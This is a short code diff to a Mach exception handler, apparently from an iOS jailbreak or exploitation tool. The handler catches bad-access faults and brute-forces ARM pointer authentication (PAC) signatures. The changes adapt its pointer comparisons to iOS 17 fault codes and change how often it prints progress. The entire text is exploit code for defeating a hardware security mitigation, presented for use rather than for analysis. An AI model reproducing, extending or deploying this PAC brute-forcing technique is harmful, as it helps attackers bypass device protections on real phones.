@@ -98,13 +98,13 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     
     new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
     
-    uint32_t ptrL = (uint32_t)code[1];
-    uint32_t ptrR = (uint32_t)brX8Address;
+    uint64_t ptrL = (uint64_t)(code[1] & 0xFFFFFFFFF);
+    uint64_t ptrR = (uint64_t)(brX8Address & 0xFFFFFFFFF);
     // code = {1, ptr} on iOS 16
     // code = {257, 0xFFFF...} on iOS 17
     if (exception == EXC_BAD_ACCESS && codeCnt == 2 &&
         (code[0] == 1 || code[0] == 257) &&
-        (ptrL == ptrR || ptrL == 0xFFFFFFFF)) {
+        (ptrL == ptrR || code[1] == 0xffffffffffffffff)) {
         uint32_t diversifier = old_state->__flags & 0xFF000000;
         if (signed_pointer == 0) {
             // Attempt to brute-force PAC
@@ -117,7 +117,7 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         
         new_state->__pc = pacBruteForcedPtr;
         pacFailedCount++;
-        if ((pacFailedCount & 0xffff) == 0) {
+        if ((pacFailedCount & 0x3ffff) == 0) {
             printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
             printf("0x%016llx\n", pacBruteForcedPtr);
         }
